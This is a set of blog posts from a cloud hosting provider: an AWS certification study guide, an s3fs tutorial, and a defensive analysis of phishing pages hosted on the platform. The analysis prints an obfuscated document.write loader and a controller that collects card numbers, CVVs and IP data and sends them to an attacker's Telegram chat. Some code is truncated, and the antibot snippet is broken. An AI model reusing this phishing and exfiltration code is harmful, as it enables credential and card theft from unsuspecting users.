border-b-white/10 pb-6"><h1 class="text-6xl font-black">How to Pass 9 AWS Certifications in 14 Months</h1> <div class="flex items-center justify-between"><div class="flex items-center gap-3"><div class="flex flex-col border-r border-r-white/20 pr-3 text-gray-400"><span class="font-black text-2xl">15</span> <span class="uppercase text-xs font-medium tracking-widest"> Jul 2022 </span></div> <span class="text-sm font-medium text-blue-400">By Kam Lasater</span></div> <div class="text-xs px-2 py-1 border border-white/20 rounded-full capitalize text-gray-300"> AWS </div></div></div> <div class="grid grid-cols-1"><div class="prose prose-xl prose-invert prose-a:text-sky-300 prose-blockquote:text-2xl prose-blockquote:border-sky-600 prose-h4:text-2xl prose-img:rounded-xl mx-auto w-full lg:w-max nuxt-content"><p>Here is how I passed 9 AWS certification tests in 14 months. Oddly the practice testing is not the most critical step. All of these steps are needed. Let me know if you try them out and how they work for you.</p> <h1 id="tldr-process"><a href="#tldr-process" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>tldr: Process</h1> <ol> <li>Be clear on <strong>WHY</strong> you are taking the exam(s)</li> <li>Set a goal of <strong>WHICH</strong> exam(s)</li> <li>Set a goal of <strong>WHEN</strong></li> <li><strong>Register</strong> for the exam</li> <li><strong>Tell</strong> everyone about the exam</li> <li>Take <strong>PRACTICE</strong> tests</li> <li><strong>Pass</strong> the exam! 🎉</li> </ol> <h1 id="why"><a href="#why" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Why</h1> <p>A <strong>WHY</strong> is important to keep focused and make sure you optimize for the outcome you are looking to achieve.</p> <p>I would not recomend this challenge for someone who thinks they will get a job out of it, or a promotion. I did find it useful to understand a broader array of the AWS service offerings and it forced me to nail the basics.</p> <p>At a past job, as a way to challenge myself and my team to dive into studying AWS I took on the challenge of passing all the AWS certification exams within 12 months. I used some elements of <a href="https://www.scotthyoung.com/blog/ultralearning/" rel="nofollow noopener noreferrer" target="_blank">Ultralearning</a> (a strategy for aggressive, self-directed learning) which I was reading at the time.</p> <p>My <strong>WHY</strong> was:</p> <ul> <li>Create a forcing function for me to learn AWS better</li> <li>Inspire my team to learn AWS better</li> <li>Test some techniques of Ultra Learning</li> </ul> <h1 id="which"><a href="#which" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Which</h1> <p>AWS is constantly changing the line up of their certifications. Depending on the current offering and your skills you may want to pick a different starting point.</p> <p>I only picked the next test or two at a time. This was my order:</p> <ul> <li>Developer - Associate</li> <li>SysOps - Associate</li> <li>Solutions Architect - Associate</li> <li>Big Data - Specialty</li> <li>Security - Specialty</li> <li>Machine Learning - Specialty</li> <li>Advanced Networking - Specialty</li> <li>DevOps Engineer - Professional</li> <li>Solutions Architect - Professional</li> </ul> <p>In general I would recommend completing all the Associate level before moving onto the Specialty. With one exception, I found the Networking Specialty exam the hardest of any of the exams. I managed to pass the first time I took it but only barely. Unless you come from a Networking background (I installed networks as a summer job in high school and admin'ed a call center and corporate lan/wan first job out of college) jump first to the Professional certifications then circle back to complete the Advanced Networking.</p> <h1 id="when"><a href="#when" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>When</h1> <p>Pick a date that gives you a realistic chance to do it, but not so far out that it has no sense of urgency.</p> <p>For me the <strong>WHEN</strong> was usually 4-8 weeks out from when I was scheduling. At the time I had to take the tests in person which meant getting a time slot that was convenient for my schedule. It took about that amount of time for the center to have a slot I wanted.</p> <h1 id="register"><a href="#register" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Register</h1> <p>Picking a date is only real if you then register.</p> <p>For me my employer paid for any certification tests I took. Also, after I passed the first one AWS issued discounts on future exams.</p> <h1 id="tell"><a href="#tell" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Tell</h1> <p>This is probably the most important step. Tell everyone. Tell anyone. This is the equivalent of tying your self to the mast.</p> <p>For me the <strong>TELL</strong> was scheduling it on the office calendar and announcing each exam to my colleagues. In my personal life it meant scheduling with my wife to coordinate childcare and usually having a play date. This meant I had multiple sets of people who were going to ask me the outcome of the test. Don't underestimate the power of feeling embarrassment in going back on your assertions with your family, friends or colleagues.</p> <h1 id="practice"><a href="#practice" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Practice</h1> <p>You now have no choice but to pass. Better get to it :)</p> <p>For each certification I purchased a collection of practice exams. I then did the following exam process for each of the three practice tests:</p> <ul> <li>If I don't have uncertainty, continue to next answer</li> <li>If I have uncertainty about an answer <ul> <li>Pick the answer I think is most correct</li> <li>Make note of the question number</li> <li>Go research the answer. It is best to read the AWS documentation. All questions are derived from the docs so all the answers must be in the documentation.</li> <li>Reread the question and check if I still think my initial answer is correct</li> </ul> </li> <li>Once complete the practice exams would give my score, they would also give me the option of looking at each wrong answer.</li> <li>Re-read each question I got wrong.</li> <li>Read the practice exam's description of why the correct answer is correct.</li> <li>Read the documentation link from the practice exam's description of the correct answer.</li> </ul> <p>Repeat for all three practice exams.</p> <p>The first exam usually would take 4-6 hours of work till the process was complete. Often I would break this across two study sessions. The second exam got faster, usually taking 2-4 hours. I could usually get the third down to 2-3 hours.</p> <p>This whole practice process usually took me about 2 weeks.</p> <h1 id="pass"><a href="#pass" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Pass</h1> <p>This was my process for taking the test:</p> <p>If I confidently know the answer:</p> <ul> <li>Select the answer.</li> <li>Reread the question, then double check just the answer.</li> <li>Note: often the answers can be exactly the same except for a single negation of part of the answer.</li> </ul> <p>For the intro level tests there is usually one answer (possibly two) that is clearly wrong. If you can confidently eliminate one or two answers, then select the one that seems the best.</p> <p>If I don't have confidence in the answer:</p> <ul> <li>Keep a list of the questions I'm not certain about</li> <li>Eliminate at least one answer</li> <li>Select the best answer from the remaining 2-3 answers</li> <li>Move on</li> </ul> <p>Once I completed all questions I would run through the same process with the list of questions I'm not confident on the answer to. I would continue the process till I ran out of time or I eliminated all questions from my list.</p> <p>Pass!</p> <p>I'm sure you did great. Let me know what you think <a href="https://twitter.com/seekayel" rel="nofollow noopener noreferrer" target="_blank">@seekayel</a></p> <p>Cheers.</p></div></div></div> <section id="subscribe-form" class="common-section border !border-neutral-700 rounded-2xl w-full lg:w-[80%] px-7 py-10 bg-neutral-800/20"><div class="flex flex-col items-center text-center"><h2 class="font-bold text-4xl mb-4">Subscribe to posts</h2> <p>Enter your email If you would like to get an email the next time we post.<br>We post about ~1-2x per month, and up to once a month about company news.<br></p></div> <div class="mt-4"><div id="embedded-form"></div></div></section> <div class="relative w-full bg-neutral-800/20 border !border-neutral-700 rounded-xl flex flex-col items-center gap-5 text-center p-8"><h2 class="text-4xl font-bold">Launch a hello world</h2> <p class="w-full md:w-[50%] text-neutral-300"> Fork and deploy a hello world project onto Cyclic faster than it has taken to read this page. Experience the power. </p> <a href="https://app.cyclic.sh/api/login" target="_blank" class="bg-primary text-white capitalize flex items-center justify-center rounded-xl px-4 py-3 gap-2 class="space-y-8 border-b border-b-white/10 pb-6"><h1 class="text-6xl font-black">Take Your File System to The Cloud with the S3fs Module from Cyclic</h1> <div class="flex items-center justify-between"><div class="flex items-center gap-3"><div class="flex flex-col border-r border-r-white/20 pr-3 text-gray-400"><span class="font-black text-2xl">17</span> <span class="uppercase text-xs font-medium tracking-widest"> Feb 2023 </span></div> <span class="text-sm font-medium text-blue-400">By Rachel Schipull</span></div> <div class="text-xs px-2 py-1 border border-white/20 rounded-full capitalize text-gray-300"> Engineering </div></div></div> <div class="grid grid-cols-1"><div class="prose prose-xl prose-invert prose-a:text-sky-300 prose-blockquote:text-2xl prose-blockquote:border-sky-600 prose-h4:text-2xl prose-img:rounded-xl mx-auto w-full lg:w-max nuxt-content"><h2 id="node-knows-files-lets-make-it-better"><a href="#node-knows-files-lets-make-it-better" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Node knows files, let's make it better</h2> <p>We all know Node.js is an amazing tool and has many fantastic built-in modules. One of those modules is the files system module or <code>fs</code>.</p> <p>The <code>fs</code> module is incredibly helpful because it allows you to write, read, update, delete (and more!) files in your local system. Furthermore, you can do any of these actions synchronously or async, which gives you (the developer) a lot of freedom in how files are accessed and stored.</p> <p>As powerful as the <code>fs</code> module is, in production relying on the local file system of a server puts the data at a big risk. And with serverless, not even possible. So long, and thanks for all the fish.</p> <p>But what if that wasn’t how it was? What if you could use cloud storage instead? And what if you didn’t have to learn everything about AWS to make it work?</p> <p>That’s what we’re here to discuss. Read on for a quick tutorial on how to swap out your Node.js <code>fs</code> module for S3 buckets and access your files no matter where they are.</p> <h3 id="lets-review-the-file-system-module"><a href="#lets-review-the-file-system-module" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Let's review the File System module</h3> <p>If you are brand new to the Node file system module, I would suggest familiarizing yourself with the different methods and how to use it locally before you jump into the Cyclic.sh s3fs npm module.</p> <p>Here’s a few tips:</p> <ul> <li>The <code>fs</code> module supports sync and async methods, which is great! But it can also be confusing if you don’t have a strong handle on the event loop and the order your requests will enter and exit. It’s important to do some testing!</li> <li>Some <code>fs</code> methods are straightforward, however some are unconventional, for example: <ul> <li>The method most commonly used for “delete” is “unlink”.</li> <li>The method for "save" is "writeFile".</li> </ul> </li> <li>There are dozens of methods included in the <code>fs</code> module. I would recommend learning more about it directly from Node.js in their documentation: <a href="https://nodejs.org/api/fs.html#file-system" rel="nofollow noopener noreferrer" target="_blank">https://nodejs.org/api/fs.html#file-system</a></li> <li>If it’s your first time trying out the file system in Node.js, it might be a good idea to try a couple short tutorials to learn the ropes. These two are clear and easy to follow: <ul> <li><a href="https://youtu.be/a6dRdtOy4Bg" rel="nofollow noopener noreferrer" target="_blank">Fs Module Node.js</a></li> <li><a href="https://youtu.be/QkwHP4d01xA" rel="nofollow noopener noreferrer" target="_blank">A Beginner's Guide To The File System Module In Node.js</a></li> </ul> </li> </ul> <hr> <h3 id="moving-from-fs-to-s3fs"><a href="#moving-from-fs-to-s3fs" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Moving from <code>fs</code> to <code>s3fs</code></h3> <p>Once you have a simple application using the <code>fs</code> in your local environment, you can deploy the application to Cyclic.</p> <p>However, you’ll notice if you try to use any of the methods you were using locally, you may receive a <code>EROFS</code> error. This is expected because once your application is deployed to production it no longer has access to the local file system.</p> <p>If only there were a way to use the same methods in production!</p> <p><em>Cyclic’s S3fs npm module enters the chat</em></p> <p>This is the moment we’ve been waiting for, so how do we set this up?</p> <p>Well first things first, we need to install the module.</p> <div class="nuxt-content-highlight"><pre class="line-numbers language-bash"><code><span class="token function">npm</span> <span class="token function">install</span> @cyclic.sh/s3fs </code></pre></div> <p>Then where you are requiring the <code>fs</code> module:</p> <div class="nuxt-content-highlight"><pre class="line-numbers language-typescript"><code><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token keyword">require</span><span class="token punctuation">(</span>‘fs’<span class="token punctuation">)</span> </code></pre></div> <p>Change it to:</p> <div class="nuxt-content-highlight"><pre class="line-numbers language-typescript"><code><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token keyword">require</span><span class="token punctuation">(</span>‘<span class="token decorator"><span class="token at operator">@</span><span class="token function">cyclic</span></span><span class="token punctuation">.</span>sh<span class="token operator">/</span>s3fs’<span class="token punctuation">)</span> </code></pre></div> <p>The module allows you to write to an AWS S3 bucket that is automatically connected to your application when you first deploy it to Cyclic. There are a couple things we need to do to give you access to that bucket.</p> <p>The bucket name is already populated in Cyclic when you deploy, you can find it under the variables tab. The environment variable is <code>CYCLIC_BUCKET_NAME</code> and the value follows the pattern of <code>cyclic-randomly-generated-app-name-aws-region-0#</code>.</p> <p>If you would like to write to the bucket while you are in your local, you will need to validate your AWS connection. (If you do not do this, your app will default to your local <code>fs</code>, and you will receive a warning.)</p> <p>Grab the temporary AWS credentials from your Cyclic dashboard (Under Data/Storage > Local Development) and paste it into your terminal.</p> <p><img alt="" src="/content/local-cred.png"></p> <p>Now you should be validated to write to the bucket. Bear in mind this validation is temporary (as these credentials are meant for testing) and will refresh every 60 minutes.</p> <p>Set it up as a variable in a .env file, and adjust your <code>fs</code> const as follows: <img alt="" src="/content/add-bucket-env.png"></p> <p>Run your application locally and see what happens!</p> <h3 id="s3fs-in-production"><a href="#s3fs-in-production" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>S3fs in Production</h3> <p>Your application is already on Cyclic, so when you push an update you should notice those <code>EROFS</code> errors have disappeared.</p> <p>In the example of this (very) <a href="https://github.com/rachelschipull/s3fs-okay" rel="nofollow noopener noreferrer" target="_blank">simple sample application</a>, when you visit the root route, it writes the date to a file when it is called, as well as prints “Hello World!” to the DOM.</p> <p><img alt="" src="/content/s3fs-root.png"></p> <p>When you visit the ‘/contents’ route, you can see the date.</p> <p><img alt="" src="/content/s3fs-contents.png"></p> <p>But that only scratches the surface of what you can do with S3 buckets storage.</p> <p>Again as a reminder, depending on which methods from the <code>fs</code> module you are using, you may need to configure your code differently.</p> <p>Be sure to reference the README from the <code>s3fs</code> module for more information: <a href="https://github.com/cyclic-software/s3fs" rel="nofollow noopener noreferrer" target="_blank">https://github.com/cyclic-software/s3fs</a></p> <p>What are you going to do with S3fs? Have more questions about S3 buckets or how to set up your project? Join us in [Discord] to continue the conversation.(<a href="https://discord.cyclic.sh" rel="nofollow noopener noreferrer" target="_blank">https://discord.cyclic.sh</a>)</p></div></div></div> <section id="subscribe-form" class="common-section border !border-neutral-700 rounded-2xl w-full lg:w-[80%] px-7 py-10 bg-neutral-800/20"><div class="flex flex-col items-center text-center"><h2 class="font-bold text-4xl mb-4">Subscribe to posts</h2> <p>Enter your email If you would like to get an email the next time we post.<br>We post about ~1-2x per month, and up to once a month about company news.<br></p></div> <div class="mt-4"><div id="embedded-form"></div></div></section> <div class="relative w-full bg-neutral-800/20 border !border-neutral-700 rounded-xl flex flex-col items-center gap-5 text-center p-8"><h2 class="text-4xl font-bold">Launch a hello world</h2> <p class="w-full md:w-[50%] text-neutral-300"> Fork and deploy a hello world project onto Cyclic faster than it has taken to read this page. class="space-y-8 border-b border-b-white/10 pb-6"><h1 class="text-6xl font-black">How phishing scampages work and what they have to do with pizza</h1> <div class="flex items-center justify-between"><div class="flex items-center gap-3"><div class="flex flex-col border-r border-r-white/20 pr-3 text-gray-400"><span class="font-black text-2xl">29</span> <span class="uppercase text-xs font-medium tracking-widest"> Aug 2023 </span></div> <span class="text-sm font-medium text-blue-400">By Mike Korostelev</span></div> <div class="text-xs px-2 py-1 border border-white/20 rounded-full capitalize text-gray-300"> engineering </div></div></div> <div class="grid grid-cols-1"><div class="prose prose-xl prose-invert prose-a:text-sky-300 prose-blockquote:text-2xl prose-blockquote:border-sky-600 prose-h4:text-2xl prose-img:rounded-xl mx-auto w-full lg:w-max nuxt-content"><p>There are a lot of dirty things you can do on the internet. There are disinformation campaigns, pirated movies, scams and cyber bullies. There is all you can eat pornography, spyware and even dubious dark web assassins.</p> <p><strong>As a hosting provider, we do what is probably the dirtiest internet thing of them all - we run code sent to us by total strangers.</strong></p> <p>At cyclic.sh, 99.9% of our users are awesome curious engineers, talented developers and innovative entrepreneurs. Unfortunately a few of you (and you know who you are) (and we know who you are) are not so awesome. In this post we showcase some of the common scams that those not-so-awesome few have tried to get away with.</p> <p>The serverless nature of the platform naturally limits (does not eliminate) the capacity for many types of malicious behavior like vulnerability scanning, crypto mining, brute force, etc. Unfortunately executing phishing attacks is still very much possible.</p>
<h2 id="phishing"><a href="#phishing" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Phishing</h2> <p>We've all been trained to come up with <code>Str0n6P@ssw0rds123!</code>. Encrypted with modern super-sophisticated algorithms, even the most powerful machines would take many decades to crack these. But, all that doesn't matter if you use that same strong password for both your Netflix and your bank account, and then give that password away.</p> <p>For most phishing scams, traffic usually comes from email clients. Users are prompted to log in to view a file that was shared with them, reset a password or confirm some info. The URL will contain some kind of convincing subdomain or a bunch of encoded garbage query strings to make it look legit.</p> <div class="nuxt-content-highlight"><pre class="line-numbers language-text"><code>https://adobe-shared-file.cyclic[.]app/login.html?isjjbyqr=Z2KA5fzNNoFkEXsbIWIDEY6VjN2Y&zentfd=H3pUFFohrG2b7r15&yewa=XNEKTU1EteKaAaqnDyFzffb&yczwfqu=mTIhOV644VPdxBtO7&bjyasthd=HedUyaoNKfOiQevwPVvNAwXjl3 </code></pre></div> <p>We've also found that most phishing scams are not perpetrated by lone wolf hackers but what seem to be organized groups, akin to the now famous YouTube <a href="https://www.youtube.com/watch?v=xsLJZyih3Ac&ab_channel=MarkRober" rel="nofollow noopener noreferrer" target="_blank">call center</a>.</p> <p>There are different implementations but the shared anatomy is:</p> <ul> <li>Legit looking domain or path that you wouldn't look at twice</li> <li>Legit looking frontend that looks just like the real thing</li> <li>Some mechanism to hide code from security scan</li> <li>Backend to anonymously exfiltrate captured data to the bad guys via: <ul> <li>Email (most often @proton.me)</li> <li>Telegram</li> <li>Discord</li> <li>MongoAtlas</li> </ul> </li> </ul> <h3 id="case-study---microsoft-scam"><a href="#case-study---microsoft-scam" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Case Study - "Microsoft Scam"</h3> <p>By far the most common and probably the most crudely implemented phishing scam we see is an attack on Microsoft accounts. Just a simple login page.</p> <p align="center"> <img format="webp" loading="lazy" src="/content/scampage-blog/ms2.png" width="650px"> </p><figcaption align="center">The Microsoft login page is the most common scam we've seen hosted on cyclic.sh</figcaption> <p></p> <h4 id="the-code"><a href="#the-code" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>The code</h4> <p>This one is a simple hello-world express.js site serving two static files <code>index.html</code> and <code>login2.html</code>. The files each contain a single line of code.</p> <div class="nuxt-content-highlight"><pre class="line-numbers language-html"><code><span class="token comment"><!-- public/index.html --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation"><</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>text/javascript<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"> str<span class="token operator">=</span><span class="token string">'x3Cx21x44x4Fx43x54x59x.....2Fx68x74x6Dx6Cx3E'</span><span class="token punctuation">;</span> <span class="token dom variable">document</span><span class="token punctuation">.</span><span class="token method function property-access">write</span><span class="token punctuation">(</span><span class="token function">unescape</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token method function property-access">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">x</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span><span class="token string">'%'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </span></span><span class="token tag"><span class="token tag"><span class="token punctuation"></</span>script</span><span class="token punctuation">></span></span> </code></pre></div> <div class="nuxt-content-highlight"><pre class="line-numbers language-html"><code><span class="token comment"><!-- public/login2.html --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation"><</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>text/javascript<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"> str<span class="token operator">=</span><span class="token string">'x3Cx21x44x4Fx43x54x59x.....2Fx68x74x6Dx6Cx3E'</span><span class="token punctuation">;</span> <span class="token dom variable">document</span><span class="token punctuation">.</span><span class="token method function property-access">write</span><span class="token punctuation">(</span><span class="token function">unescape</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token method function property-access">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">x</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span><span class="token string">'%'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </span></span><span class="token tag"><span class="token tag"><span class="token punctuation"></</span>script</span><span class="token punctuation">></span></span> </code></pre></div> <p>This code obfuscated, encoded to hide its contents. Most crawler bots do not execute javascript. The contents would also be hidden from a host like that is doing basic level static analysis during deployment. When loaded in a victim's browser, <code>document.write</code> renders those malicious jQuery <code>$</code>'s.</p> <p align="center"> <img format="webp" loading="lazy" src="/content/scampage-blog/ms3.png" width="650px"> </p><figcaption align="center">Obfuscated code is rendered in browser with `document.write`</figcaption> <p></p> <p>The login takes place in a sequence of prompts, just like the real thing. The username is captured in <code>index.html</code>, the user is then redirected to <code>login2.html</code> which prompts the user for their password. On submit, the credential pair is ajax posted to a PHP url.</p> <p>In all instances of this scam, the target url pointed to a <code>.php</code> file on what looked to be totally legitimate host domains who had become victims of a remote file inclusion (RFI) attack. Older misconfigured phpMyAdmin installations were vulnerable to XSS attacks, SQL injection, and in many cases had their default password left on. These vulnerable servers tend to be hosting legitimate small business websites like dental practices, restaurants or other service providers.</p> <p>In this instance <code>finish.php</code> was likely injected into the host maliciously by exploiting one of those PHP vulnerabilities. These <code>.php</code> files simply use php's <code>mail</code> function to then forward the credentials to some email set up by the attackers.</p> <h3 id="case-study---adobenetflix-scam"><a href="#case-study---adobenetflix-scam" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Case Study - "Adobe/Netflix Scam"</h3> <p>Another very common scam we see targets your Netflix account.</p> <p align="center"> <img format="webp" loading="lazy" src="/content/scampage-blog/netflix.png" width="650px"> </p><figcaption align="center">Another common scam targets Adobe, Netflix, and others with similar backend code</figcaption> <p></p> <p>While Adobe and Netfix have been most common as of late, we've seen almost identical backend code for various frontends targeting America First Credit Union, CapitalOne, DHL, Netflix and others.</p> <h4 id="the-code-1"><a href="#the-code-1" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>The code</h4> <p>Implementation here is a more sophisticated full stack express site built using MVC pattern and a nicely organized file structure.</p> <p align="center"> <img format="webp" loading="lazy" src="/content/scampage-blog/netflix_files.png" width="150px"> </p><figcaption align="center">Phishing site file structure</figcaption> <p></p> <p>Mimicking the authentic login sequence, the frontend is separated into multiple <code>.edge</code> files rendered with the <a href="https://github.com/ecrmnn/express-edge" rel="nofollow noopener noreferrer" target="_blank">express-edge</a> view engine. The CSS and HTML have been ripped off from the real login page:</p> <p align="center"> <img format="webp" loading="lazy" src="/content/scampage-blog/netflix_frontend.png" width="650px"> </p><figcaption align="center">The frontend is a clone that uses html ripped off from the original site</figcaption> <p></p> <p>All the links to the Privacy Policy, Help Center and TOS still work and point to the real targets. The big difference is the form post on the scam page points to <code>/auth/login</code>.</p> <h3 id="what-happens-to-your-credentials"><a href="#what-happens-to-your-credentials" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>What happens to your credentials</h3> <h4 id="appjs"><a href="#appjs" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a><code>app.js</code></h4> <p>First lets look at <code>app.js</code> before looking at the <code>/auth/login</code> controller:</p> <p align="center"> <img format="webp" loading="lazy" src="/content/scampage-blog/netflix_appjs.png" width="650px"> </p><figcaption align="center">The sites implements an anti-bot middleware</figcaption> <p></p> <p>Suspiciously authored by a git user with the name <code>Disney Plus</code>, there is something interesting in the <code>app.js</code> file.</p> <div class="nuxt-content-highlight"><pre class="line-numbers language-js"><code><span class="token comment">// Bot Detection Middlewares</span> app<span class="token punctuation">.</span><span class="token method function property-access">use</span><span class="token punctuation">(</span>antibot<span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre></div> <p>There are good guys crawling the web looking for malicious sites like this. The scammers don't want to be found. While this attacker is not masking their code to subvert static analysis, they are are trying to protect the scam site against dynamic scans. For example if Google is scanning links in the email body in your GMail inbox.</p> <div class="nuxt-content-highlight"><pre class="line-numbers language-js"><code><span class="token comment">// antibot.js</span>

res<span class="token punctuation">.</span><span class="token method function property-access">redirect</span><span class="token punctuation">(</span><span class="token string">'/auth/login/2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">;</span> </code></pre></div> <p>The user data is formatted nicely and decorated with pretty icons before it is sent as a message to a Telegram chat set up by the attacker.</p> <p>This route then redirects to <code>/auth/login/2</code> and the user is taken to the billing page where their credit card info will be captured:</p> <div class="nuxt-content-highlight"><pre class="line-numbers language-js"><code><span class="token punctuation">[</span><span class="token spread operator">...</span><span class="token punctuation">]</span>
exports<span class="token punctuation">.</span><span class="token method-variable function-variable method function property-access">loginPost2</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token arrow operator">=></span> <span class="token punctuation">{</span> <span class="token keyword">const</span> <span class="token punctuation">{</span> cardNum<span class="token punctuation">,</span> expDate<span class="token punctuation">,</span> cvv <span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token property-access">body</span><span class="token punctuation">;</span> <span class="token keyword">const</span> clientIP <span class="token operator">=</span> <span class="token function">getClientIp</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">getIPDetails</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword control-flow">return</span> ipInfo <span class="token punctuation">.</span><span class="token method function property-access">getIPInfo</span><span class="token punctuation">(</span>clientIP<span class="token punctuation">)</span> <span class="token punctuation">.</span><span class="token method function property-access">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token arrow operator">=></span> <span class="token punctuation">{</span> <span class="token keyword">var</span> data <span class="token operator">=</span> data<span class="token punctuation">;</span> <span class="token keyword control-flow">return</span> data<span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token punctuation">.</span><span class="token keyword control-flow">catch</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token arrow operator">=></span> <span class="token punctuation">{</span> <span class="token console class-name">console</span><span class="token punctuation">.</span><span class="token method function property-access">log</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
<span class="token keyword">const</span> iPDetails <span class="token operator">=</span> <span class="token keyword control-flow">await</span> <span class="token function">getIPDetails</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">const</span> <span class="token punctuation">{</span> ipAddress<span class="token punctuation">,</span> <span class="token maybe-class-name">Time</span> <span class="token punctuation">}</span> <span class="token operator">=</span> iPDetails<span class="token punctuation">;</span>
<span class="token keyword">const</span> message <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">👾 SHAKESWORDE | NETFL1X | USER_</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>ipAddress<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">\n\n</span><span class="token template-punctuation string">`</span></span> <span class="token operator">+</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">👤 BILLING INFO\n</span><span class="token template-punctuation string">`</span></span> <span class="token operator">+</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">CARD NUMBER : </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>cardNum<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">\n</span><span class="token template-punctuation string">`</span></span> <span class="token operator">+</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">EXPIRY DATE : </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>expDate<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">\n</span><span class="token template-punctuation string">`</span></span> <span class="token operator">+</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">CVV : </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>cvv<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">\n\n</span><span class="token template-punctuation string">`</span></span> <span class="token operator">+</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">🌍 GEO-IP INFO\n</span><span class="token template-punctuation string">`</span></span> <span class="token operator">+</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">IP ADDRESS : </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>ipAddress<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">\n</span><span class="token template-punctuation string">`</span></span> <span class="token operator">+</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">TIME : </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token maybe-class-name">Time</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">\n\n</span><span class="token template-punctuation string">`</span></span> <span class="token operator">+</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">💬 Telegram: https://t.me/UpdateTeams\n</span><span class="token template-punctuation string">`</span></span> <span class="token operator">+</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">🌐 Website: Coming soon!!\n</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
<span class="token keyword">const</span> sendMessage <span class="token operator">=</span> <span class="token function">sendMessageFor</span><span class="token punctuation">(</span>botToken<span class="token punctuation">,</span> chatId<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">sendMessage</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>
